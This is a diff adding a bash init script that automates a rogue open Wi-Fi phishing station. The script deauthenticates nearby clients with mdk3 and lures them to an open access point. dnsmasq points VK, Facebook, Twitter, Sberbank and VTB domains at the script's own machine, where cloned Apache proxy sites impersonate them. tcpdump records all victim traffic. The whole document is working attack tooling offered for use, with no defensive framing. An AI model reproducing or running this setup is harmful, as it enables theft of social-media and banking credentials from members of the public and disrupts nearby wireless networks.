@@ -1,0 +1,409 @@
+#!/bin/bash
+
+### BEGIN INIT INFO
+# Provides:             open-wifi-automatron
+# Required-Start:
+# Required-Stop:
+# Default-Start:        2 3 4 5
+# Default-Stop:
+# Short-Description:    OPEN WiFi fishing automatization script
+### END INIT INFO
+
+MNGMT_IFACE="eth0"
+INTERNET_IFACE="eth1"
+AP_IFACE="wlan1"
+MDK3_IFACE="wlan2"
+
+AP_ESSID="MT_FREE"
+AP_CHANELL="1"
+AP_IP="192.168.100.1"
+AP_MASK="24"
+
+DHCP_FIRST="192.168.100.10"
+DHCP_LAST="192.168.100.250"
+DHCP_MASK="255.255.255.0"
+RESOLVE_SERVER_1="1.1.1.1"
+RESOLVE_SERVER_2="1.0.0.1"
+
+MNGMT_IP="192.168.10.1"
+MNGMT_MASK="24"
+
+DEAUTH_CHANNEL="1,2,3,4,5,6,7,8,9,10,11,12"
+
+CURRENT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+CURRENT_NAME="$(basename "$(test -L "$0" && readlink "$0" || echo "$0")")"
+LOG_DIR="/var/log"
+CONF_DIR="/etc/automatron"
+
+sites=("https://vk.com" "https://m.vk.com" "https://login.vk.com" "https://facebook.com" "https://www.facebook.com" \
+"https://m.facebook.com" "https://graph.facebook.com" "https://twitter.com" "https://api.twitter.com" \
+"https://www.twitter.com" "https://mobile.twitter.com" "https://online.sberbank.ru" "https://stat.online.sberbank.ru" \
+"https://scr.online.sberbank.ru" "https://online.vtb.ru" "https://online.vtb24.ru")
+
+BLUE='\033[1;34m'
+RED='\033[1;31m'
+GREEN='\033[1;32m'
+ORANGE='\033[1;33m'
+NC='\033[0m'
+
+INFO="${BLUE}[*]${NC} "
+ERROR="${RED}[-]${NC} "
+SUCESS="${GREEN}[+]${NC} "
+WARNING="${ORANGE}[!]${NC} "
+
+# Check required software
+function check_required_software {
+    if ! dpkg --list | grep -qe "ii\s*tcpdump " || ! dpkg --list | grep -qe "ii\s*apache2 " || ! dpkg --list | grep -qe "ii\s*libapache2-mod-security2 " || ! dpkg --list | grep -qe "ii\s*hostapd " || ! dpkg --list | grep -qe "ii\s*dnsmasq-base " || ! dpkg --list | grep -qe "ii\s*mdk3 "
+    then
+        apt update
+        apt -y -qq install tcpdump apache2 libapache2-mod-security2 hostapd dnsmasq-base mdk3
+    fi
+}
+
+# Delete certs and keys
+function delete_certs {
+    for site in ${sites[*]}
+    do
+            host="${site//https:\/\//}"
+            host="${host//http:\/\//}"
+            rm /etc/ssl/certs/${host}.crt 2>/dev/null
+            rm /etc/ssl/certs/${host}.pem 2>/dev/null
+            rm /etc/ssl/private/${host}.key 2>/dev/null
+    done
+}
+
+# Kill others copies of this script
+function kill_others_copies {
+    while read -r PID
+    do
+        if [ ${PID} -lt $$ ]
+        then
+            kill -9 ${PID}
+        fi
+    done < <(pgrep "${CURRENT_NAME}")
+}
+
+# Kill interrupt process
+function kill_interrupt_process {
+    /etc/init.d/network-manager stop 2>/dev/null
+    killall wpa_supplicant 2>/dev/null
+}
+
+# Network settings
+function network_settings {
+
+    # Network interface settings
+    while true
+    do
+        if ip link show | grep "${INTERNET_IFACE}" >/dev/null 2>&1; then
+            echo -e "${SUCESS}Interface ${INTERNET_IFACE} exist!";
+            if ifconfig ${INTERNET_IFACE} | grep -q "inet "; then
+                echo -e "${SUCESS}Interface ${INTERNET_IFACE} is configured.";
+                break
+            else
+                echo -e "${ERROR}Interface ${INTERNET_IFACE} is not configured, wait..."
+                dhclient ${INTERNET_IFACE} >/dev/null 2>&1
+            fi
+        else
+            echo -e "${ERROR}Interface ${INTERNET_IFACE} not found, wait..."
+            sleep 10
+    fi
+    done
+
+    while true
+    do
+        if ip link show | grep "${AP_IFACE}" >/dev/null 2>&1; then
+            echo -e "${SUCESS}Interface ${AP_IFACE} exist!";
+            if ifconfig ${AP_IFACE} | grep -q "inet ${AP_IP}"; then
+                echo -e "${SUCESS}Interface ${AP_IFACE} is configured.";
+                break
+            else
+                echo -e "${INFO}Interface ${AP_IFACE} is not configured, wait..."
+                ifconfig ${AP_IFACE} down
+                ifconfig ${AP_IFACE} ${AP_IP}/${AP_MASK}
+                ifconfig ${AP_IFACE} up
+            fi
+        else
+            echo -e "${ERROR}Interface ${AP_IFACE} not found, wait..."
+            sleep 10
+    fi
+    done
+
+    while true
+    do
+        if ip link show | grep "${MDK3_IFACE}" >/dev/null 2>&1; then
+            echo -e "${SUCESS}Interface ${MDK3_IFACE} exist!";
+            if iwconfig ${MDK3_IFACE} | grep -q "Mode:Monitor"; then
+                echo -e "${SUCESS}Interface ${MDK3_IFACE} is configured.";
+                break
+            else
+                echo -e "${INFO}Interface ${MDK3_IFACE} is not configured, wait..."
+                ifconfig ${MDK3_IFACE} down
+                iwconfig ${MDK3_IFACE} mode monitor
+                ifconfig ${MDK3_IFACE} up
+            fi
+        else
+            echo -e "${ERROR}Interface ${MDK3_IFACE} not found, wait..."
+            sleep 10
+    fi
+    done
+
+
+    while true
+    do
+        if ip link show | grep "${MNGMT_IFACE}" >/dev/null 2>&1; then
+            echo -e "${SUCESS}Interface ${MNGMT_IFACE} exist!";
+            if ifconfig ${MNGMT_IFACE} | grep -q "inet ${MNGMT_IP}"; then
+                echo -e "${SUCESS}Interface ${MNGMT_IFACE} is configured.";
+                break
+            else
+                echo -e "${INFO}Interface ${MNGMT_IFACE} is not configured, wait..."
+                ifconfig ${MNGMT_IFACE} down
+                ifconfig ${MNGMT_IFACE} ${MNGMT_IP}/${MNGMT_MASK}
+                ifconfig ${MNGMT_IFACE} up
+            fi
+        else
+            echo -e "${ERROR}Interface ${AP_IFACE} not found, wait..."
+            sleep 10
+    fi
+    done
+
+    # IP forward
+    iptables -t nat -F
+    iptables -t nat -X
+    iptables -F
+    iptables -X
+
+    iptables -t nat -A POSTROUTING -o ${INTERNET_IFACE} -j MASQUERADE
+    iptables -A FORWARD -i ${AP_IFACE} -o ${INTERNET_IFACE} -j ACCEPT
+    echo '1' > /proc/sys/net/ipv4/ip_forward
+}
+
+# Apache2 fish settings
+function apache2_settings {
+    if [ ! -d "${CONF_DIR}" ]; then
+        mkdir ${CONF_DIR}
+    fi
+
+    if [ ! -d "${CONF_DIR}/Apache2-fish/" ]; then
+        git clone https://github.com/Vladimir-Ivanov-Git/Apache2-fish.git ${CONF_DIR}/Apache2-fish/
+    fi
+
+    python ${CONF_DIR}/Apache2-fish/apache2_setup_proxy.py -E
+
+    # Create fishing sites
+    for site in ${sites[*]}
+    do
+            python ${CONF_DIR}/Apache2-fish/apache2_setup_proxy.py -q -u ${site}
+            host="${site//https:\/\//}"
+            host="${host//http:\/\//}"
+    done
+}
+
+function apache2_stop {
+    /etc/init.d/apache2 stop
+    sleep 10
+}
+
+# Apache2 watchdog
+function apache2_start {
+    apache2_stop
+
+    # Enable sites
+    while read -r apache2_site
+    do
+        a2ensite $apache2_site >/dev/null 2>&1
+    done < <(ls /etc/apache2/sites-available/)
+
+    while true
+    do
+        if pgrep -x "apache2" > /dev/null
+        then
+            sleep 10
+        else
+            /etc/init.d/apache2 start
+            sleep 10
+        fi
+    done &
+}
+
+# Hostapd settings
+function hostapd_settings {
+    cat >${CONF_DIR}/hostapd.conf <<EOH
+interface=${AP_IFACE}
+driver=nl80211
+ssid=${AP_ESSID}
+channel=${AP_CHANELL}
+EOH
+
+    chmod 666 ${CONF_DIR}/hostapd.conf
+}
+
+function hostapd_stop {
+    kill -9 $(pgrep hostapd) >/dev/null 2>&1
+}
+
+# Hostapd watchdog
+function hostapd_start {
+    hostapd_stop
+    while true
+    do
+        if pgrep -x "hostapd" > /dev/null
+        then
+            sleep 10
+        else
+            /usr/sbin/hostapd ${CONF_DIR}/hostapd.conf -B -f ${LOG_DIR}/hostapd.log
+        fi
+    done &
+}
+
+# Dnsmasq settings
+function dnsmasq_settings {
+    cat >${CONF_DIR}/dnsmasq.conf <<EOD
+server=${RESOLVE_SERVER_1}
+server=${RESOLVE_SERVER_2}
+interface=${AP_IFACE}
+listen-address=${AP_IP}
+bind-interfaces
+domain-needed
+bogus-priv
+domain=local.net
+expand-hosts
+local=/local.net/
+dhcp-range=${DHCP_FIRST},${DHCP_LAST},${DHCP_MASK},12h
+dhcp-option=3,${AP_IP}
+dhcp-option=6,${AP_IP}
+log-queries
+log-facility=${LOG_DIR}/dnsmasq.log
+EOD
+
+    echo -n "address=/" >> ${CONF_DIR}/dnsmasq.conf
+    for site in ${sites[*]}
+    do
+            domain="${site//https:\/\//}"
+            domain="${domain//http:\/\//}"
+            echo -n "${domain}/" >> ${CONF_DIR}/dnsmasq.conf
+    done
+
+    echo "${AP_IP}" >> ${CONF_DIR}/dnsmasq.conf
+
+    chmod 666 ${CONF_DIR}/dnsmasq.conf
+}
+
+function dnsmasq_stop {
+    kill -9 $(pgrep dnsmasq) >/dev/null 2>&1
+}
+
+# Dnsmasq watchdog
+function dnsmasq_start {
+    dnsmasq_stop
+    while true
+    do
+        if pgrep -x "dnsmasq" > /dev/null
+        then
+            sleep 10
+        else
+            /usr/sbin/dnsmasq -C ${CONF_DIR}/dnsmasq.conf
+        fi
+    done &
+}
+
+# MDK3 settings
+function mdk3_settings {
+    cat /sys/class/net/${AP_IFACE}/address > ${CONF_DIR}/whilelist.txt
+    chmod 666 ${CONF_DIR}/whilelist.txt
+}
+
+function mdk3_stop {
+    kill -9 $(pgrep mdk3) >/dev/null 2>&1
+}
+
+function mdk3_start {
+    mdk3_stop
+    while true
+    do
+        if pgrep -x "mdk3" > /dev/null
+        then
+            sleep 10
+        else
+            /usr/sbin/mdk3 ${MDK3_IFACE} d -w ${CONF_DIR}/whilelist.txt -c ${DEAUTH_CHANNEL} >${LOG_DIR}/mdk3.log 2>&1 &
+        fi
+    done &
+}
+
+# Tcpdump settings
+function tcpdump_settings {
+    if [ ! -d "${LOG_DIR}/tcpdump/" ]; then
+        mkdir ${LOG_DIR}/tcpdump/
+    fi
+}
+
+function tcpdump_stop {
+    kill -9 $(pgrep tcpdump) >/dev/null 2>&1
+}
+
+function tcpdump_start {
+    tcpdump_stop
+    while true
+    do
+        if pgrep -x "tcpdump" > /dev/null
+        then
+            sleep 10
+        else
+            tcpdump -i ${AP_IFACE} -s 65535 -w ${LOG_DIR}/tcpdump/${AP_ESSID}-traffic-`date +%Y_%m_%d_%H.%M.%S`.pcap -W 100 -C 100 >/dev/null 2>&1
+        fi
+    done &
+}
+
+# Management interface settings
+#function management_iface_settings {
+#    if ! iwconfig ${MNGMT_IFACE} | grep -q "no wireless extensions"; then
+#            cat >${CONF_DIR}/mngmt_hostapd.conf <<EOM
+#interface=${MNGMT_IFACE}
+#driver=nl80211
+#ssid=MNGMT
+#channel=6
+#wpa=2
+#wpa_passphrase=Passw0rd12#
+#wpa_key_mgmt=WPA-PSK
+#wpa_pairwise=TKIP
+#rsn_pairwise=CCMP
+#auth_algs=1
+#EOM
+#        chmod 666 ${CONF_DIR}/mngmt_hostapd.conf
+#        /usr/sbin/hostapd ${CONF_DIR}/mngmt_hostapd.conf -B
+#    fi
+#}
+
+case "$1" in
+start)
+    kill_others_copies
+    kill_interrupt_process
+
+    network_settings
+    hostapd_settings
+    dnsmasq_settings
+    mdk3_settings
+    tcpdump_settings
+
+    apache2_start
+    hostapd_start
+    dnsmasq_start
+    mdk3_start
+    tcpdump_start
+    ;;
+kill)
+    kill -9 `ps aux | grep automatron | grep -v grep | awk '{print $2}'`
+    ;;
+init)
+    check_required_software
+    apache2_start
+    apache2_settings
+    apache2_start
+    ;;
+delete_certs)
+    delete_certs
+    ;;
+*)
+    echo -e "${INFO}Usage: ${CURRENT_DIR}/${CURRENT_NAME} {init|start|kill|delete_certs}"
+esac
